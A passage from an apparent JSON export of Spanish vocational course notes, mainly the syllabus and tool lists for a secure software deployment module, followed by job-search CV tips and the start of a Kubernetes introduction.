y probar código en lenguajes como Python, Java y C++; usar herramientas de análisis estático para identificar problemas.\nHerramientas: IDEs (PyCharm, Eclipse), análisis estático (Pylint, FindBugs), frameworks de prueba (pytest, JUnit).\nAdicional: Estudios de casos sobre cómo la elección del lenguaje impactó la seguridad, como el uso de C en sistemas críticos.\n\nCriterio 1.b: Describir diferentes modelos de ejecución de software\n\nConceptos: Modelos como cliente-servidor, microservicios y monolíticos; implicaciones de seguridad en cada uno.\nPrácticas: Configurar aplicaciones simples en diferentes modelos; identificar riesgos de seguridad mediante análisis.\nHerramientas: Servidores web (Apache, Nginx), contenedores (Docker), pasarelas API.\nAdicional: Ejemplos de brechas de seguridad relacionadas con modelos de ejecución, como ataques a microservicios mal configurados.\n\nCriterio 1.c: Reconocer elementos básicos del código fuente, dándoles significado\n\nConceptos: Constructos de programación (variables, funciones, clases); cómo pueden introducir vulnerabilidades si se usan incorrectamente.\nPrácticas: Revisar código para identificar problemas de seguridad; refactorizar código inseguro.\nHerramientas: Editores de código con linting (Visual Studio Code), herramientas de análisis estático (SonarQube).\nAdicional: Introducir estándares de codificación segura, como CERT y OWASP.\n\nCriterio 1.d: Ejecutar diferentes tipos de prueba de software\n\nConceptos: Pruebas unitarias, de integración, de sistema; pruebas de seguridad como penetración y fuzzing.\nPrácticas: Escribir pruebas unitarias; realizar pruebas de penetración; usar herramientas de fuzzing.\nHerramientas: Frameworks de prueba (JUnit, pytest), herramientas de seguridad (Burp Suite, AFL).\nAdicional: Discutir la importancia de las pruebas en el ciclo de vida del desarrollo de software (SDLC) y su integración con DevOps.\n\nCriterio 1.e: Evaluar lenguajes de programación según la infraestructura de seguridad que proporcionan\n\nConceptos: Características de seguridad en lenguajes (e.g., seguridad de memoria en Rust); vulnerabilidades comunes por lenguaje.\nPrácticas: Comparar lenguajes mediante análisis de código; usar escáneres de seguridad específicos.\nHerramientas: Escáneres de seguridad (Bandit para Python, FindSecBugs), comprobadores de dependencias (OWASP Dependency-Check).\nAdicional: Explorar por qué lenguajes como Ada o Rust son preferidos en aplicaciones críticas de seguridad.\n"},"CETI/Puesta-en-produccion-segura/RA-2/Unidad-2---RA-2":{"title":"Unidad 2 - RA 2","links":[],"tags":[],"content":"Resultado de Aprendizaje 2: Determinación del nivel de seguridad requerido por aplicaciones\nCriterio 2.a: Caracterizar los niveles de verificación de seguridad en aplicaciones (ASVS)\n\nConceptos: Niveles de verificación de ASVS (Nivel 1, 2, 3) y sus requisitos.\nPrácticas: Revisar documentación de ASVS; evaluar aplicaciones de muestra para determinar el nivel adecuado.\nHerramientas: Listas de verificación de ASVS, herramientas de evaluación de seguridad.\nAdicional: Comparar ASVS con otros estándares (e.g., ISO 27001); analizar estudios de casos.\n\nCriterio 2.b: Identificar el nivel de verificación de seguridad requerido según riesgos\n\nConceptos: Metodologías de evaluación de riesgos; mapeo de riesgos a niveles de ASVS.\nPrácticas: Realizar evaluación de riesgos en una aplicación hipotética; usar matrices de riesgo.\nHerramientas: OWASP Risk Rating Methodology, plantillas de evaluación de riesgos.\nAdicional: Ejemplos de fallos en la evaluación de riesgos que llevaron a brechas de seguridad.\n\nCriterio 2.c: Enumerar los requisitos de verificación necesarios\n\nConceptos: Controles específicos para cada nivel de ASVS; cómo aplicarlos a una aplicación.\nPrácticas: Crear planes de verificación; priorizar requisitos según las características de la aplicación.\nHerramientas: Listas de verificación de ASVS, herramientas de gestión de proyectos (Jira).\nAdicional: Explorar cómo integrar ASVS en el proceso de desarrollo; posibilidades de automatización.\n\nCriterio 2.d: Reconocer los principales riesgos de las aplicaciones\n\nConceptos: Riesgos comunes (OWASP Top Ten); identificación según tipo de aplicación.\nPrácticas: Realizar modelado de amenazas; priorizar riesgos según probabilidad e impacto.\nHerramientas: Microsoft Threat Modeling Tool, recursos de OWASP.\nAdicional: Discutir riesgos emergentes en tecnologías como IoT; mantenerse actualizado con CVE.\n"},"CETI/Puesta-en-produccion-segura/RA-3/Unidad-3---RA-3":{"title":"Unidad 3 - RA 3","links":[],"tags":[],"content":"Resultado de Aprendizaje 3: Detección y corrección de vulnerabilidades de aplicaciones web\nCriterio 3.a: Validar las entradas de los usuarios\n\nConceptos: Técnicas de validación de entrada (sintáctica, semántica); vulnerabilidades como XSS y SQLi.\nPrácticas: Implementar validación en código; probar debilidades con herramientas.\nHerramientas: WAFs, análisis estático, herramientas de pruebas de penetración (Burp Suite).\nAdicional: Principio de no confiar en la entrada del usuario; validación en múltiples capas.\n\nCriterio 3.b: Detectar riesgos de inyección en servidor y cliente\n\nConceptos: Tipos de inyección (SQL, OS, código); prevención mediante consultas parametrizadas.\nPrácticas: Identificar puntos de inyección; implementar correcciones en código.\nHerramientas: SQLMap, análisis estático, escáneres de vulnerabilidades (Acunetix).\nAdicional: Analizar ataques de inyección famosos; uso de frameworks ORM para prevención.\n\nCriterio 3.c: Gestionar correctamente la sesión del usuario\n\nConceptos: Vulnerabilidades de gestión de sesiones (fijación, secuestro); mejores prácticas como cookies seguras.\nPrácticas: Implementar gestión de sesiones segura; probar vulnerabilidades.\nHerramientas: Herramientas de desarrollo del navegador, Burp Suite, bibliotecas de sesiones seguras.\nAdicional: Comparar autenticación basada en tokens (JWT) con sesiones tradicionales.\n\nCriterio 3.d: Usar roles para el control de acceso\n\nConceptos: Principios de control de acceso (menor privilegio); implementación de RBAC.\nPrácticas: Diseñar e implementar RBAC; probar controles de acceso.\nHerramientas: Frameworks de autenticación (Spring Security), herramientas de pruebas de penetración.\nAdicional: Errores comunes como referencias directas a objetos; auditoría de decisiones de acceso.\n\nCriterio 3.e: Usar algoritmos criptográficos seguros para contraseñas\n\nConceptos: Hashing de contraseñas; algoritmos recomendados (bcrypt, Argon2).\nPrácticas: Implementar hashing; verificar almacenamiento; intentar cracking éticamente.\nHerramientas: Bibliotecas de hashing (bcrypt), herramientas de cracking (Hashcat).\nAdicional: Políticas de contraseñas; autenticación multifactor.\n\nCriterio 3.f: Configurar servidores web para reducir riesgos\n\nConceptos: Endurecimiento de servidores; cabeceras de seguridad (HSTS, CSP).\nPrácticas: Configurar servidores con mejores prácticas; escanear configuraciones erróneas.\nHerramientas: Guías de configuración (Mozilla Observatory), escáneres (Nikto).\nAdicional: Configuración de HTTPS; análisis de logs para detección de ataques.\n\nCriterio 3.g: Incorporar medidas contra ataques automatizados\n\nConceptos: Ataques automatizados (brute force, spam); CAPTCHAs, limitación de tasas.\nPrácticas: Implementar CAPTCHAs; configurar limitación de tasas; simular ataques.\nHerramientas: reCAPTCHA, WAFs con detección de bots, herramientas de monitorización.\nAdicional: Equilibrio entre seguridad y experiencia del usuario; detección de bots basada en ML.\n"},"CETI/Puesta-en-produccion-segura/RA-4/Unidad-4---RA-4":{"title":"Unidad 4 - RA 4","links":[],"tags":[],"content":"Resultado de Aprendizaje 4: Detección de problemas de seguridad en aplicaciones para dispositivos móviles\nCriterio 4.a: Comparar modelos de permisos de plataformas móviles\n\nConceptos: Sistemas de permisos en Android e iOS; implicaciones de seguridad.\nPrácticas: Desarrollar apps que soliciten permisos; analizar manifests.\nHerramientas: Android Studio, Xcode, MobSF.\nAdicional: Evolución de modelos de permisos; gestión de permisos por usuarios.\n\nCriterio 4.b: Describir técnicas de almacenamiento seguro de datos\n\nConceptos: Métodos de almacenamiento (preferencias, bases de datos); encriptación de datos.\nPrácticas: Implementar almacenamiento encriptado; inspeccionar datos de la app.\nHerramientas: Bibliotecas de encriptación, herramientas forenses (uso educativo).\nAdicional: Diferencias entre almacenamiento en Android e iOS; manejo seguro de datos en memoria.\n\nCriterio 4.c: Implementar validación de compras integradas con validación en servidor\n\nConceptos: Mecánicas de compras in-app; riesgos de validación del lado del cliente.\nPrácticas: Configurar compras; implementar validación del servidor; probar spoofing.\nHerramientas: SDKs de plataforma (Google Play Billing, StoreKit), frameworks del lado del servidor.\nAdicional: Técnicas de fraude; manejo de reembolsos y suscripciones.\n\nCriterio 4.d: Usar herramientas de monitorización de tráfico de red\n\nConceptos: Protocolos seguros vs. inseguros; ataques MITM; pinning de certificados.\nPrácticas: Inspeccionar tráfico con herramientas; implementar pinning.\nHerramientas: Wireshark, Burp Suite, Charles Proxy.\nAdicional: Manejo de claves API; impacto de VPNs en seguridad.\n\nCriterio 4.e: Inspeccionar binarios para buscar fugas de información\n\nConceptos: Información en binarios (cadenas, claves); técnicas de ofuscación.\nPrácticas: Descompilar apps; buscar datos sensibles; aplicar ofuscación.\nHerramientas: jadx, apktool, ProGuard.\nAdicional: Aspectos legales y éticos del reverse engineering; protección de propiedad intelectual.\n"},"CETI/Puesta-en-produccion-segura/RA-5/Unidad-5---RA-5":{"title":"Unidad 5 - RA 5","links":[],"tags":[],"content":"Resultado de Aprendizaje 5: Implantación de sistemas seguros de desplegado de software\nCriterio 5.a: Identificar características, principios y objetivos de DevOps\n\nConceptos: Beneficios de DevOps; principios de colaboración y automatización.\nPrácticas: Participar en simulaciones de DevOps; analizar estudios de casos.\nHerramientas: Herramientas de colaboración (Slack), gestión de proyectos (Jira).\nAdicional: Cambios culturales necesarios; integración de DevSecOps.\n\nCriterio 5.b: Implementar sistemas de control de versiones\n\nConceptos: Flujos de trabajo de Git; control de acceso en sistemas de control de versiones.\nPrácticas: Configurar repositorios Git; implementar protección de ramas; realizar revisiones de código.\nHerramientas: GitHub, GitLab, Bitbucket.\nAdicional: Manejo seguro de secretos; uso de Git hooks para automatización.\n\nCriterio 5.c: Instalar, configurar y verificar sistemas de integración continua\n\nConceptos: Beneficios de la integración continua; configuración de pipelines.\nPrácticas: Crear pipelines de CI; integrar comprobaciones de seguridad.\nHerramientas: Jenkins, GitHub Actions, Travis CI.\nAdicional: Manejo de entornos (desarrollo, staging, producción); automatización de escaneos de seguridad.\n\nCriterio 5.d: Planificar, implementar y automatizar planes de despliegue\n\nConceptos: Estrategias de despliegue (blue-green, canary); automatización con herramientas.\nPrácticas: Configurar pipelines de despliegue; implementar rollback; usar infraestructura como código.\nHerramientas: Ansible, Terraform, Kubernetes.\nAdicional: Monitoreo de despliegues; técnicas de despliegue sin tiempo de inactividad.\n\nCriterio 5.e: Evaluar la capacidad del sistema para reaccionar ante fallos\n\nConceptos: Resiliencia del sistema; auto-escalado; comprobaciones de salud.\nPrácticas: Configurar auto-escalado; simular fallos; observar respuestas.\nHerramientas: Herramientas de auto-escalado en la nube (AWS Auto Scaling), Prometheus, Chaos Monkey.\nAdicional: Ingeniería del caos; diseño de sistemas con fallos en mente.\n\nCriterio 5.f: Documentar tareas y procedimientos para recuperación ante desastres\n\nConceptos: Planificación de recuperación ante desastres; RTO/RPO; backups.\nPrácticas: Crear planes de recuperación; documentar procedimientos; simular desastres.\nHerramientas: Herramientas de backup, plataformas de documentación (Confluence).\nAdicional: Ejemplos reales de recuperación ante desastres; servicios de recuperación en la nube.\n\nCriterio 5.g: Crear bucles de retroalimentación ágiles entre miembros del equipo\n\nConceptos: Importancia de la retroalimentación en agile/DevOps; prácticas de comunicación.\nPrácticas: Participar en ceremonias agile (standups, retrospectivas); configurar dashboards de métricas.\nHerramientas: Slack, Jira, Grafana.\nAdicional: Fomentar una cultura de mejora continua; importancia de la seguridad psicológica en equipos.\n"},"CETI/Puesta-en-produccion-segura/Temario":{"title":"Temario","links":["CETI/Puesta-en-produccion-segura/RA-1/Unidad-1---RA-1","CETI/Puesta-en-produccion-segura/RA-2/Unidad-2---RA-2","CETI/Puesta-en-produccion-segura/RA-3/Unidad-3---RA-3","CETI/Puesta-en-produccion-segura/RA-4/Unidad-4---RA-4","CETI/Puesta-en-produccion-segura/RA-5/Unidad-5---RA-5"],"tags":["Apuntes","Temas","Puesta","Producción","Segura"],"content":"Desglose del temario PPS: RA - Criterios - Contenidos\nIntroducción a python: tryhackme.com/r/room/pythonbasics\n1. Prueba aplicaciones web y aplicaciones para dispositivos móviles analizando la estructura del código y su modelo de ejecución.\nCriterios de evaluación:\na) Se han comparado diferentes lenguajes de programación de acuerdo a sus características principales.\n\nContenido asociado: Lenguajes de programación interpretados y compilados\nEnlace: CE 1a\n\nb) Se han descrito los diferentes modelos de ejecución de software.\n\nContenido asociado: Ejecución de software\nEnlace: CE 1b\n\nc) Se han reconocido los elementos básicos del código fuente, dándoles significado.\n\nContenido asociado: Fundamentos de la programación\nContenido asociado: Código fuente y entornos de desarrollo\nContenido asociado: Elementos principales de los programas\nEnlace: CE 1c\n\nd) Se han ejecutado diferentes tipos de prueba de software.\n\nContenido asociado: Pruebas. Tipos\nEnlace: CE 1d\n\ne) Se han evaluado los lenguajes de programación de acuerdo a la infraestructura de seguridad que proporcionan.\n\nContenido asociado: Seguridad en los lenguajes de programación y sus entornos de ejecución (“sandboxes”)\nEnlace: CE 1e\n\n2. Determina el nivel de seguridad requerido por aplicaciones identificando los vectores de ataque habituales y sus riesgos asociados.\nCriterios de evaluación:\na) Se han caracterizado los niveles de verificación de seguridad en aplicaciones establecidos por los estándares internacionales (ASVS, “Application Security Verification Standard”).\n\nContenido asociado: Fuentes abiertas para el desarrollo seguro\nContenido asociado: Comprobaciones de seguridad a nivel de aplicación: ASVS\nEnlace: CE 2a\n\nb) Se ha identificado el nivel de verificación de seguridad requerido por las aplicaciones en función de sus riesgos de acuerdo a estándares reconocidos.\n\nEnlace: CE 2b\n\nc) Se han enumerado los requisitos de verificación necesarios asociados al nivel de seguridad establecido.\n\nContenido asociado: Requisitos de verificación necesarios asociados al nivel de seguridad establecido\nEnlace: CE 2c\n\nd) Se han reconocido los principales riesgos de las aplicaciones desarrolladas, en función de sus características.\n\nContenido asociado: Listas de riesgos de seguridad habituales: OWASP Top Ten (web y móvil)\nEnlace: CE 2d\n\n3. Detecta y corrige vulnerabilidades de aplicaciones web analizando su código fuente y configurando servidores web.\nCriterios de evaluación:\na) Se han validado las entradas de los usuarios.\n\nContenido asociado: Desarrollo seguro de aplicaciones web\nContenido asociado: Entrada basada en formularios. Inyección. Validación de la entrada\nEnlace: CE 3a\n\nb) Se han detectado riesgos de inyección tanto en el servidor como en el cliente.\n\nContenido asociado: Listas públicas de vulnerabilidades de aplicaciones web. OWASP Top Ten\nEnlace: CE 3b\n\nc) Se ha gestionado correctamente la sesión del usuario durante el uso de la aplicación.\n\nContenido asociado: Estándares de autenticación y autorización\nContenido asociado: Robo de sesión\nEnlace: CE 3c\n\nd) Se ha hecho uso de roles para el control de acceso.\n\nEnlace: CE 3d\n\ne) Se han utilizado algoritmos criptográficos seguros para almacenar las contraseñas de usuario.\n\nContenido asociado: Almacenamiento seguro de contraseñas\nEnlace: CE 3e\n\nf) Se han configurado servidores web para reducir el riesgo de sufrir ataques conocidos.\n\nContenido asociado: Vulnerabilidades web\nContenido asociado: Seguridad de portales y aplicativos web. Soluciones WAF\nEnlace: CE 3f\n\ng) Se han incorporado medidas para evitar los ataques a contraseñas, envío masivo de mensajes o registros de usuarios a través de programas automáticos (bots).\n\nContenido asociado: Contramedidas. HSTS, CSP, CAPTCHAs, entre otros\nEnlace: CE 3g\n\n4. Detecta problemas de seguridad en las aplicaciones para dispositivos móviles, monitorizando su ejecución y analizando ficheros y datos.\nCriterios de evaluación:\na) Se han comparado los diferentes modelos de permisos de las plataformas móviles.\n\nContenido asociado: Modelos de permisos en plataformas móviles. Llamadas al sistema protegidas\nEnlace: CE 4a\n\nb) Se han descrito técnicas de almacenamiento seguro de datos en los dispositivos, para evitar la fuga de información.\n\nContenido asociado: Almacenamiento seguro de datos\nEnlace: CE 4b\n\nc) Se ha implantado un sistema de validación de compras integradas en la aplicación haciendo uso de validación en el servidor.\n\nContenido asociado: Validación de compras integradas en la aplicación\nEnlace: CE 4c\n\nd) Se han utilizado herramientas de monitorización de tráfico de red para detectar el uso de protocolos inseguros de comunicación de las aplicaciones móviles.\n\nContenido asociado: Soluciones CASB\nEnlace: CE 4d\n\ne) Se han inspeccionado binarios de aplicaciones móviles para buscar fugas de información sensible.\n\nContenido asociado: Firma y verificación de aplicaciones\nContenido asociado: Fuga de información en los ejecutables\nEnlace: CE 4e\n\n5. Implanta sistemas seguros de desplegado de software, utilizando herramientas para la automatización de la construcción de sus elementos.\nCriterios de evaluación:\na) Se han identificado las características, principios y objetivos de la integración del desarrollo y operación del software.\n\nContenido asociado: Puesta segura en producción\nContenido asociado: Prácticas unificadas para el desarrollo y operación del software (DevOps)\nEnlace: CE 5a\n\nb) Se han implantado sistemas de control de versiones, administrando los roles y permisos solicitados.\n\nContenido asociado: Sistemas de control de versiones\nEnlace: CE 5b\n\nc) Se han instalado, configurado y verificado sistemas de integración continua, conectándolos con sistemas de control de versiones.\n\nContenido asociado: Sistemas de automatización de construcción (build)\nContenido asociado: Integración continua y automatización de pruebas\nEnlace: CE 5c\n\nd) Se han planificado, implementado y automatizado planes de desplegado de software.\n\nContenido asociado: Escalado de servidores. Virtualización. Contenedores\nContenido asociado: Gestión automatizada de configuración de sistemas\nContenido asociado: Orquestación de contenedores\nEnlace: CE 5d\n\ne) Se ha evaluado la capacidad del sistema desplegado para reaccionar de forma automática a fallos.\n\nContenido asociado: Herramientas de simulación de fallos\nEnlace: CE 5e\n\nf) Se han documentado las tareas realizadas y los procedimientos a seguir para la recuperación ante desastres.\n\nEnlace: CE 5f\n\ng) Se han creado bucles de retroalimentación ágiles entre los miembros del equipo.\n\nEnlace: CE 5g\n"},"CETI/Puesta-en-produccion-segura/index":{"title":"Puesta en producción segura","links":["CETI/Puesta-en-produccion-segura/Temario"],"tags":[],"content":"Puesta en Producción Segura es un módulo del curso de especialización en ciberseguridad en entornos de las tecnologías de la información (CETI). En esta documentación pretendo realizar una sugerencia de contenidos que se pueden impartir en cada uno de los resultados de aprendizaje esperados.\nTodo el temario analizado en el siguiente enlace:\n\nTemario\n\nTabla Resumen de Herramientas por Resultado de Aprendizaje\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nResultado de AprendizajeHerramientas Clave1. Prueba de aplicacionesPyCharm, Eclipse, Pylint, FindBugs, pytest, JUnit, Burp Suite, AFL, SonarQube, Bandit, OWASP Dependency-Check2. Nivel de seguridadASVS Checklists, OWASP Risk Rating, Microsoft Threat Modeling Tool, Jira3. Vulnerabilidades webBurp Suite, SQLMap, Acunetix, Spring Security, bcrypt, Hashcat, Nikto, reCAPTCHA, Mozilla Observatory4. Seguridad móvilAndroid Studio, Xcode, MobSF, Wireshark, Charles Proxy, jadx, apktool, ProGuard, Google Play Billing, StoreKit5. Despliegue seguroGitHub, GitLab, Jenkins, GitHub Actions, Ansible, Terraform, Kubernetes, AWS Auto Scaling, Prometheus, Chaos Monkey, Confluence, Slack, Grafana\nEnlaces relevantes:\n\nOWASP Official Website\nOWASP ASVS Project\nPyCharm IDE\nEclipse IDE\nPylint Static Analysis\nFindBugs for Java\npytest Testing Framework\nJUnit Testing Framework\nBurp Suite Security Testing\nAmerican Fuzzing Lop (AFL)\nSonarQube Code Quality\nBandit Python Security Scanner\nOWASP Dependency-Check\nApache Web Server\nNginx Web Server\nDocker Containerization\nVisual Studio Code Editor\nOWASP Risk Rating Methodology\nMicrosoft Threat Modeling Tool\nJira Project Management\nOWASP Top Ten Project\nSQLMap Injection Testing\nAcunetix Web Vulnerability Scanner\nSpring Security Framework\nbcrypt Password Hashing\nHashcat Password Cracker\nNikto Security Scanner\nGoogle reCAPTCHA\nMozilla Observatory\nAndroid Studio IDE\nXcode IDE\nMobile Security Framework (MobSF)\nWireshark Network Analyzer\nCharles Proxy\njadx Decompiler\napktool Reverse Engineering\nProGuard Obfuscation\nGoogle Play Billing Library\nApple StoreKit Framework\nSlack Collaboration Platform\nGitHub Version Control\nGitLab Version Control\nBitbucket Version Control\nJenkins CI/CD\nGitHub Actions CI/CD\nTravis CI\nAnsible Automation\nTerraform Infrastructure as Code\nKubernetes Container Orchestration\nAWS Auto Scaling\nPrometheus Monitoring\nChaos Monkey Resilience Testing\nConfluence Documentation\nGrafana Dashboards\n"},"CETI/index":{"title":"CETI","links":["CETI/Hacking-ético/","CETI/Incidentes-de-ciberseguridad/","CETI/Normativa-de-ciberseguridad/","CETI/Puesta-en-produccion-segura/"],"tags":["CETI","Apuntes"],"content":"\n\n                  \n                  Warning\n                  \n                \n\nEsto es un trabajo en curso. Aún en una fase alfa.\n\n\nMateriales preparados para el Curso de Especialización en Ciberseguridad en Entornos de las Tecnologías de la Información (CETI)\nInformación general:\n\nwww.todofp.es/que-estudiar/familias-profesionales/informatica-comunicaciones/ce-ciberseguridad-entornos-tecnologias-informacion.html\n\nTemario de cada módulo profesional:\n\nHacking Ético: HE\nIncidentes de Ciberseguridad: IC\nNormativa de Ciberseguridad: NC\nPuesta en Producción Segura: PPS\n"},"DAW/Despliegue-de-aplicaciones-web/Hosting-gratuitos":{"title":"Hosting gratuitos","links":[],"tags":[],"content":"Hosting PHP\n\nwww.infinityfree.com/\napp.laravel.cloud/\n\nGeneral\n\nrender.com/\n\nBase de datos\n\naiven.io/\nsupabase.com/pricing\nfirebase.google.com\n\nFree tier\n\nOracle cloud\n"},"DAW/Despliegue-de-aplicaciones-web/RA-1/Servidores-web":{"title":"Servidores web","links":[],"tags":[],"content":"\nNginx\nApache\nsimplewebserver.org/\nIaaS, PaaS, SaaS\n"},"DAW/Despliegue-de-aplicaciones-web/consejos-busqueda-de-trabajo":{"title":"consejos-busqueda-de-trabajo","links":[],"tags":[],"content":"Consejos búsqueda de trabajo\nEsto es un boceto de consejos generales. Ya se terminará de escribir.\nConsejos:\n\nCrea una cuenta en linkedin. Recuerda generar el enlace corto a tu perfil. Rellena en linkedin información sobre experiencia laboral, proyectos, tecnologías que conoces, intereses…\nCrea una cuenta en infojobs. De nuevo, rellena la información relevante en tu perfil.\nCrea una cuenta en Github. Sube proyectos públicos interesantes que hayas hecho en algún momento y te sientas orgulloso de ello. Recuerda redactar archivos Readme.md para entenderlos.\nCrea una web como portfolio. Algo muy sencillo es hacerlo con github pages. En ese portfolio describe tus intereses, proyectos interesantes, trabajos que hayas hecho, experiencia con herramientas o tecnologías, etc…\nCompra un dominio propio, algo parecido a www.nombreApellido.com. Lo puedes registrar a través de cloudflare.\nVincula tu dominio con tu web de portfolio. Ahora genera un código QR con dicha web.\nCrea un currículum en papel (o formato folio/pdf). Puedes emplear la herramienta Canva para ello. En dicho currículum incluye los enlaces a tu perfil en github, linkedin e infojobs. Recuerda también incluir el código QR a tu página web portfolio. Rellena en el currículum tus intereses, tecnologías, proyectos, experiencia laboral y otros méritos. Recuerda ser conciso. Debe ocupar 1 carilla o 2 como máximo. Nunca más de 2.\nLa foto de tus redes de networking y currículum debe ser profesional. Fondo blanco, transparente o desenfocado. Usa una camisa mejor que una camiseta. No salgas completamente de frente respecto a la cámara, mejor girar un poco el cuerpo y la cabeza.\n\nCómo hacer el cv de papel:\n\nPoner foto. Normalmente suele ser un tema polémico, pero en general recomiendo añadir la foto.\nA la derecha de la foto recomiendo añadir datos generales y contacto:\n\nnombre, apellidos, teléfono, email.\nNo suele recomendar poner fecha nacimiento, ni edad, ni dirección.\nfoto la suelo poner (fondo blanco, no de frente, camisa).\n\n\nDebajo de los datos de contacto:\n\nEnlace de tu perfil de linkedin, infojobs, github, portfolio, tryhackme/hackthebox/cyberdefenders/lets defend.\n\n\nSi la web de porfolio es muy buena, recomiendo generar un QR del enlace de la web y ponerla debajo de la foto de perfil.\nA la derecha del QR del portfolio recomiendo añadir un párrafo o dos hablando de aspectos generales/introductorios/intereses sobre ti (proactivo, resolutivo, autodidacta).\nDebajo del QR y del párrafo de descripción entramos en una sección donde mostramos qué sabemos:\n\nexperiencia laboral o proyectos (3-4 como máximo) (las prácticas es un ejemplo de experiencia laboral). Cada una de las experiencias laborales debe tener:\n\nNombre de la empresa - Cargo ( PE: desarrollador backend) - Fecha\nDescripción de lo que hiciste\nListado de tecnologías que usaste\n\n\nCon los proyectos que hayas hecho por tu cuenta sucede algo similar:\n\nNombre del proyecto, enlace (si está desplegado, por ejemplo, en github pages, infinityfree…) y fecha\nDescripción del proyecto\nTecnologías usadas.\n\n\n\n\nDebajo de la experiencia: formación\n\nDAW\nASIR\nDAM\nSMR\nInglés B2/C1\nNO recomiendo incluir la ESO o el bachiller.\n\n\nOtras formaciones/certificados\n\nCCNA (Cisco)\nEJPT\nCarné de conducir\n\n\nSolo si es relevante: Inquietudes\n"},"DAW/Despliegue-de-aplicaciones-web/devops":{"title":"devops","links":[],"tags":[],"content":"DevOps\nTODO: Algunas ideas que desarrollar en el futuro.\nMetodología: Scrum (Agile) + Kanban\nCI/CD: Jenkins/Github actions\nTest unitarios, test de integración, calidad de código y vulnerabilidades: Jest + Sonarqube\nInfrastructure as Code: Terraform + ansible\nIaaS (ec2) vs PaaS (Vercel)\nTDD (Test Driven Development)\nAWS / Azure"},"DAW/Despliegue-de-aplicaciones-web/index":{"title":"Despliegue de aplicaciones web","links":["DAW/Despliegue-de-aplicaciones-web/kubernetes/","DAW/Despliegue-de-aplicaciones-web/consejos-busqueda-de-trabajo","DAW/Despliegue-de-aplicaciones-web/devops"],"tags":[],"content":"\nKubernetes\nconsejos-busqueda-de-trabajo\ndevops\n"},"DAW/Despliegue-de-aplicaciones-web/kubernetes/1.-introduccion-a-kubernetes/1.0-introduccion-a-kubernetes":{"title":"1.0-introduccion-a-kubernetes","links":[],"tags":[],"content":"1. Introducción a Kubernetes\nEn los últimos años se ha ido extendiendo el uso de contenedores como elementos esenciales para el uso de aplicaciones en entornos en producción, tanto más cuanto más variable sea la demanda, la frecuencia con la que se actualizan o la necesidad de que funcionen de forma ininterrumpida.\nGestionar una aplicación sobre contenedores, que pueda actualizarse rápidamente, que sea escalable o tolerante a fallos, es una tarea compleja que se realiza mediante un software específico que recibe el nombre de orquestador de contenedores.\nKubernetes es un software de orquestación de contenedores desarrollado inicialmente por Google, pero que hoy en día es un proyecto libre independiente utilizado en gran cantidad de entornos diferentes y que se ha convertido en muchos casos en la solución preferida para orquestar aplicaciones basadas en contenedores en entornos en producción.\nEn este curso conoceremos las principales características de Kubernetes y de las aplicaciones más adecuadas para poner en este entorno y comprobaremos de forma práctica la tolerancia a fallos, la escalabilidad de una aplicación o la gestión del versionado y los diferentes enfoques a la hora de hacerlo en entornos en producción, con o sin interrupciones."},"DAW/Despliegue-de-aplicaciones-web/kubernetes/1.-introduccion-a-kubernetes/1.1-implantacion-de-aplicaciones-web-en-contenedores":{"title":"1.1-implantacion-de-aplicaciones-web-en-contenedores","links":[],"tags":[],"content":"1.1 Implantación de aplicaciones web en contenedores\nEl protocolo http, o su extensión https, ha ido convirtiéndose poco a poco en el “superprotocolo” de Internet y ha ido desplazando paulatinamente el uso de otros protocolos.\nDe igual forma, la mayor parte del software que se consume hoy en día se podría denominar de forma genérica como aplicación web, aunque hay diferencias importantes sobre la forma de presentarse, ya que no es lo mismo que una persona acceda a una aplicación a través de un navegador, a través de una aplicación móvil o que quien acceda a la aplicación sea una máquina.\nEn este curso no podemos entrar en detalle sobre las características de estas aplicaciones web, pero sí en las características que deben tener los sistemas que las ofrecen para que cumplan con los requisitos esperados.\nRequisitos habituales de las aplicaciones web\nPensemos inicialmente en el caso de una aplicación interna de una empresa que está instalada localmente y que los únicos usuarios que tiene son la plantilla de empleados de la empresa. En ese caso, es fácil determinar los recursos necesarios para que la aplicación funcione de forma adecuada, porque ni el uso de la aplicación se dispara en unos instantes, ni el número de empleados de una empresa varía de forma abrupta.\nPor otra parte, las actualizaciones se pueden hacer en momentos en los que el uso es mínimo y, si es necesario una interrupción del servicio, se puede programar para un momento determinado en que tenga muy poco impacto. Las aplicaciones de este tipo no se suelen modificar habitualmente, sino que lo hacen de forma bastante espaciada en el tiempo, por lo que los cambios entre una versión y otra son significativos. Esto, que podríamos llamar informática tradicional, también tiene un impacto importante en la forma de desarrollar las aplicaciones que funcionan bajo este esquema.\nPor otra parte, una aplicación web que esté disponible en Internet, tiene miles de millones de potenciales usuarios, que la pueden usar las 24 horas del día y cualquier día del año. Esto tiene unas consecuencias muy importantes, ya que es muy difícil determinar los recursos necesarios para prestar servicios a una demanda muy variable e idealmente, el servicio no puede interrumpirse nunca.\nPero, ¿esto cómo se hace?. ¿Es posible que el mismo sistema se ajuste a una demanda que puede variar de un usuario a un millón?, ¿es posible tener un sistema siempre actualizado y que a la vez no se pare?, ¿cómo se aplican las actualizaciones de software?, ¿poco a poco o con grandes saltos?. Durante este curso, veremos que precisamente esto es lo que trata de proporcionar Kubernetes.\nComponentes auxiliares de un servicio web\nEl componente esencial para servir una aplicación web es un servidor web, pero vamos a ver a continuación, que para poder proporcionar el servicio con los requisitos anteriores, debe apoyarse en un número importante de componentes auxiliares. En los siguientes apartados vamos a ir viendo paso a paso la forma de ir incluyendo diferentes componentes auxiliares y cómo esta inclusión va a ir cambiando la arquitectura de los sistemas que proporcionan el servicio.\nPaso 1. Punto de partida\nSupongamos que nuestra organización proporciona tres aplicaciones web diferentes que son accesibles a través de las URL:\nexample.com/app1\nexample.com/app2\nexample.com/app3\nEstas aplicaciones pueden estar desarrolladas en el mismo lenguaje o en varios diferentes (Python, Java, PHP, etc.), pueden utilizar una base de datos, almacenamiento auxiliar y como se sirven a través de https, es necesario gestionar los certificados x509.\nEl esquema inicial que pensaríamos para proporcionar estas tres aplicaciones sería una máquina (física o virtual) en la que instalaríamos el servidor web, los servidores de aplicaciones (php, java, …), el servidor de bases de datos, etc… tal y como aparece en la siguiente imagen:\n\nPaso 2. Servidor de bases de datos separado\nDesde un punto de vista de seguridad, ubicar el servidor de bases de datos en el mismo equipo que el servidor web es totalmente inadecuado, ya que el servidor web, por su propia naturaleza debe permitir que cualquier usuario acceda desde Internet y una vulnerabilidad en este equipo podría exponer los datos que se ubican en las bases de datos a un potencial atacante. Además, desde el punto de vista del rendimiento y la disponibilidad, separar los 